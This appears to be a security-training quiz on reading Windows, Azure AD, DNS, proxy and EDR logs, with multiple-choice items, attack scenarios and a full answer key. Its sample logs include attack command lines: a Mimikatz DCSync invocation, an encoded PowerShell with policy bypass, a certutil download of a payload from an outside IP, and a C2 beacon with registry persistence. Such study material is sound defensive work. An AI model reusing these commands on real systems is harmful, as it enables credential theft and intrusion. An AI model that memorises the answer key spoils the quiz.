# Phase 8 Quiz — Log Reading and Analysis

**Time limit:** 45 minutes
**Total questions:** 20
**Passing score:** 16/20

---

## Section A — Multiple Choice (1 point each)

**Question 1:**
Windows Event ID 4624 with Logon Type 10 indicates:

A) A user logged in physically at the keyboard
B) A scheduled task ran as a service account
C) An RDP (Remote Desktop) connection was established
D) A user unlocked their screensaver

---

**Question 2:**
You see 3,500 Event ID 4625 entries in 30 minutes, all targeting the same account "administrator" from one external IP. What is this?

A) Normal help desk password reset activity
B) A targeted brute force attack against the administrator account
C) A DGA malware infection
D) A misconfigured monitoring tool

---

**Question 3:**
Event ID 1102 in the Windows Security log means:

A) A user account was created
B) A scheduled task was created
C) The audit log was cleared
D) A file was accessed

---

**Question 4:**
In Azure AD sign-in logs, "impossible travel" is detected when:

A) A user travels internationally on business
B) The same user account logs in from two geographically distant locations in an impossibly short time
C) A user logs in from multiple devices simultaneously
D) A user's password expires while traveling

---

**Question 5:**
A proxy log shows POST requests to an external URL with Content-Type: application/octet-stream and a data size of 4.7 GB at 3 AM with no authenticated user. What does this indicate?

A) An automatic Windows update downloading patches
B) A scheduled backup to cloud storage
C) Large-scale data exfiltration
D) A software installation package being distributed

---

**Question 6:**
In an EDR process tree, you see: excel.exe → cmd.exe → powershell.exe → mshta.exe → network connection. What does this tell you?

A) The user is using Excel to browse the web
B) Excel triggered a malicious macro chain that used multiple Windows tools to make a network connection
C) Microsoft Office is performing a legitimate update
D) A user ran a PowerShell script from Excel to check network connectivity

---

**Question 7:**
Sysmon Event ID 22 records:

A) Process creation events
B) Network connection events
C) DNS query events
D) Registry modification events

---

## Section B — Log Analysis (2 points each)

Analyze each log and answer the questions.

---

**Question 8:**
```
2024-03-15T02:44:00Z EventID: 4624
  Account Name: da-backup
  Logon Type: 10 (RemoteInteractive)
  Source Network Address: 45.142.212.100
  Authentication Package: NTLM
  
2024-03-15T02:44:01Z EventID: 4672
  Account Name: da-backup
  Privileges Assigned: SeDebugPrivilege, SeBackupPrivilege, SeTcbPrivilege
  
2024-03-15T02:44:15Z EventID: 4688
  Account Name: da-backup
  Creator: explorer.exe
  New Process: C:\Windows\Temp\m64.exe
  Command Line: m64.exe "lsadump::dcsync /domain:company.com /all" exit
```

What is happening in this sequence? Identify the attack techniques by name. What data was accessed?

---

**Question 9:**
```
Azure AD Sign-In Log:
2024-03-15T09:00:00Z  sarah.jones@company.com  SUCCESS  New York  Chrome/Windows  Risk: None
2024-03-15T09:00:00Z  sarah.jones@company.com  SUCCESS  Lagos,NG  Firefox/Linux   Risk: High

Microsoft 365 Audit Log:
2024-03-15T09:01:00Z  New-InboxRule  sarah.jones  Name:"Auto Clean"  
                       Action: DeleteMessage  Conditions: Subject contains "security","alert","password reset"
2024-03-15T09:02:00Z  FileDownloaded (×38) from /sites/HR/ConfidentialFiles/
2024-03-15T09:04:00Z  Send  sarah.jones → hr-data@gmail.com  Attachment: employee-records.zip
```

Describe the complete attack chain. What specific actions did the attacker take after gaining access?

---

**Question 10:**
```
DNS Logs (2024-03-15):
03:00:01  192.168.7.33  aaronsmith.company.com       SUCCESS  192.168.10.50
03:00:02  192.168.7.33  dc01.company.com              SUCCESS  192.168.10.1
03:00:03  192.168.7.33  fileserver01.company.com      SUCCESS  192.168.10.10
03:00:04  192.168.7.33  sqlserver01.company.com       SUCCESS  192.168.10.20
03:00:05  192.168.7.33  backupserver.company.com      SUCCESS  192.168.10.30
03:00:06  192.168.7.33  payroll.company.com           SUCCESS  192.168.10.40
[Continues for 5 minutes, querying all internal hostnames]
```

What is the device at 192.168.7.33 doing? What stage of the attack kill chain is this?

---

**Question 11:**
```
Windows Security Log:
2024-03-15T03:00:00Z  EventID 4625  User: admin        Source: 192.168.1.88  Logon Type: 3  (×500)
2024-03-15T03:00:00Z  EventID 4625  User: backup       Source: 192.168.1.88  Logon Type: 3  (×500)
2024-03-15T03:00:00Z  EventID 4625  User: service      Source: 192.168.1.88  Logon Type: 3  (×500)
2024-03-15T03:05:00Z  EventID 4624  User: backup       Source: 192.168.1.88  Logon Type: 3  (SUCCESS)
2024-03-15T03:05:01Z  EventID 5140  User: backup       Share: \\DC01\ADMIN$
2024-03-15T03:05:10Z  EventID 4698  TaskName: \Helper  Command: C:\Windows\Temp\task.exe  Actor: backup
```

Source IP 192.168.1.88 is an internal computer (DHCP: assigned to LAPTOP-MWILLIAMS).
What happened? What does this tell you about LAPTOP-MWILLIAMS?

---

## Section C — Full Scenario Investigation (3 points each)

**Question 12:**
You receive a SIEM alert at 14:33: "Malware execution detected on LAPTOP-KCARTER."

Here is all available evidence:

Email Security Log (14:22):
```
Sender: shipping@fedex-update-2024.com  (domain registered 2 days ago)
Recipient: k.carter@company.com
Subject: Package Delivery Failed - Action Required
Attachment: DeliveryNotice.docm  SHA256: a4b5c6d7...
Detection: Clean (not detected by email security AV)
DMARC: Fail
```

EDR Log (14:31):
```
14:31:00 LAPTOP-KCARTER winword.exe opened: DeliveryNotice.docm
14:31:05 winword.exe → cmd.exe → powershell.exe -exec bypass -enc JABjAGwA...
14:31:07 powershell.exe → certutil.exe -urlcache -f http://185.220.101.47/update.bin C:\Temp\svc.exe
14:31:09 svc.exe started
14:31:10 svc.exe → network: evil-c2-domain.com:443 ESTABLISHED
14:31:15 svc.exe → file created: C:\Users\kcarter\AppData\Roaming\update.exe
14:31:16 svc.exe → registry HKCU\Run\UpdateService = C:\...\update.exe
```

Proxy Log:
```
14:22:31 k.carter GET https://fedex-update-2024.com/delivery-notice 200
14:31:07 LAPTOP-KCARTER certutil GET http://185.220.101.47/update.bin 200 1,241,024
14:31:10 LAPTOP-KCARTER svc.exe GET https://evil-c2-domain.com/beacon 200 12
```

DNS Log:
```
14:31:07 LAPTOP-KCARTER → 185.220.101.47 direct (no DNS needed, used IP directly)
14:31:09 LAPTOP-KCARTER → evil-c2-domain.com → 185.220.101.47
```

Write a complete incident analysis including:
1. How the attack started
2. What each stage did (with evidence)
3. The current state of the system
4. What your immediate containment actions are
5. What you need to investigate further

---

**Question 13:**
The following events all occurred on 2024-03-15. Write a timeline connecting them and explain the complete attack scenario:

```
02:00:00 Azure AD: 847 failed logins for various @company.com accounts from 185.220.101.47
02:08:33 Azure AD: Login SUCCESS for it.admin@company.com from 185.220.101.47 (IP is known bad)
02:08:35 Azure AD: MFA method changed for it.admin@company.com (phone → authenticator app)
02:08:40 Azure AD: New application consent granted: "Super Sync Pro" → Mail.ReadWrite, Files.ReadWrite.All
02:09:00 M365 Audit: New-InboxRule by it.admin: Forward all → itbackup@protonmail.com
02:10:00 M365 Audit: FileDownloaded ×127 from /sites/IT/Infrastructure/ by it.admin
02:11:00 M365 Audit: SharePoint external sharing enabled for site /sites/IT/Infrastructure/
02:11:30 Azure AD: it.admin assigned Global Administrator role to external_user@gmail.com
02:12:00 M365 Audit: Send by it.admin → 12 external recipients [Subject: "IT Security Update Required"]
```

---

## Answer Key

**Section A:**
1. C — Type 10 = RemoteInteractive = RDP
2. B — 3,500 failures from one IP targeting one account = targeted brute force
3. C — 1102 = audit log cleared
4. B — Same account, different geographic locations, impossible in the time frame
5. C — Large POST at 3 AM with no user = data exfiltration
6. B — Excel macro chain using Windows tools for malicious network access
7. C — Event ID 22 = DNS query

**Section B:**

8. (2 points) Sequence of events:
- 02:44:00: Attacker logs into Domain Controller or server via RDP (Logon Type 10) from external IP 45.142.212.100 using the "da-backup" account (likely a compromised Domain Admin backup account). NTLM authentication suggests either Kerberos failed or this is a Pass-the-Hash attack.
- 02:44:01: Special privileges logged — SeDebugPrivilege (needed for credential dumping), SeBackupPrivilege, SeTcbPrivilege confirm this is a highly privileged account.
- 02:44:15: "m64.exe" (disguised Mimikatz) runs DCSync against the entire domain. The command "lsadump::dcsync /domain:company.com /all" extracts ALL password hashes from Active Directory — every user, every service account, every computer account. This is a DCSync attack. The attacker now has complete credential material for the entire domain.

9. (2 points) Complete attack chain:
1. sarah.jones's account was compromised — two simultaneous logins from New York and Lagos at exactly the same time (same second), from different devices and browsers. The Lagos login is the attacker (compromised credentials from phishing or password spray).
2. The attacker created an inbox rule called "Auto Clean" to delete emails with security/alert keywords — hiding breach notifications from the real Sarah.
3. The attacker downloaded 38 confidential HR files.
4. The attacker emailed the files to an external Gmail address (hr-data@gmail.com) — data exfiltration and potential insider data sale or espionage.

10. (2 points) 192.168.7.33 is performing internal DNS reconnaissance — resolving every internal hostname to discover the company's internal infrastructure. It queries the domain controller, file server, SQL server, backup server, and payroll server by hostname in rapid succession. This is the Discovery stage of the kill chain (MITRE ATT&CK: T1016 — System Network Configuration Discovery, T1018 — Remote System Discovery). An attacker on this machine is mapping the internal network to identify high-value targets. Investigate which process is making these DNS queries.

11. (2 points) LAPTOP-MWILLIAMS (192.168.1.88) performed an internal password spray against multiple service accounts (admin, backup, service) on the domain controller, then successfully authenticated as "backup" and immediately:
1. Accessed the ADMIN$ share (remote admin access to the DC)
2. Created a scheduled task to run malware from C:\Windows\Temp\
This tells us LAPTOP-MWILLIAMS is compromised — either by malware performing automated lateral movement, or an attacker using MWILLIAMS' machine as a pivot point to attack the domain controller. The machine performed 1,500 authentication failures then succeeded and installed persistence on the DC. Critical incident.

**Section C:**

12. (3 points) Complete incident analysis:
1. Attack initiation: k.carter received a spear-phishing email from a 2-day-old fake FedEx domain at 14:22. Despite DMARC failure, the email was delivered (p=none). The email contained a malicious Word document (.docm) that bypassed email AV detection (0-day or novel malware).
2. Attack chain: At 14:31, k.carter opened the document in Word. A malicious macro executed within 5 seconds, launching PowerShell with execution policy bypass and an encoded command (hiding the payload). PowerShell used certutil.exe (legitimate Windows tool — LotL) to download malware from the attacker's IP. The malware executed and established C2 communication to evil-c2-domain.com within 1 second.
3. Current state: LAPTOP-KCARTER is fully compromised. The C2 connection is active. Persistence is established (AppData executable + Run registry key). The attacker has remote control of the machine and can escalate from here.
4. Immediate containment: Isolate LAPTOP-KCARTER from the network via EDR remote isolation. Block 185.220.101.47 and evil-c2-domain.com at the firewall. Disable k.carter's domain account temporarily. Block fedex-update-2024.com. Delete the phishing email from all inboxes.
5. Further investigation: Did k.carter have cached credentials of privileged accounts? Did the C2 already issue commands? Have other employees received the same email? Has the attacker moved laterally from KCARTER? Forensic image of KCARTER needed.

13. (3 points) Complete attack timeline:
1. 02:00-02:08: Password spray attack — 847 failed logins across multiple accounts from known-bad IP.
2. 02:08:33: Attack succeeded — it.admin compromised.
3. 02:08:35: CRITICAL — Attacker immediately changed MFA method. This is called "MFA swapping" or "authenticator hijack." The attacker registered their own authenticator app, locking out the legitimate admin while giving themselves persistent MFA access.
4. 02:08:40: OAuth consent granted to "Super Sync Pro" — a malicious OAuth application that now has permanent access to read all email and all files, independent of the account password. Even if the password is reset, the OAuth app retains access.
5. 02:09: Email forwarding rule created to send all future emails to attacker's ProtonMail.
6. 02:10: 127 IT infrastructure files downloaded (network diagrams, credentials, configuration files).
7. 02:11: External sharing enabled — infrastructure data shared publicly.
8. 02:11:30: Global Admin role granted to external Gmail account — backdoor admin access established independent of it.admin account.
9. 02:12: 12 phishing emails sent from the compromised account to legitimate-appearing recipients (supply chain phishing).
Total time: 12 minutes. Complete tenant compromise. Required remediation: revoke all sessions, reset it.admin, revoke the OAuth app consent, remove the external Global Admin, delete the inbox rule, restore all changed settings, check all recipients of the phishing emails sent at 02:12.
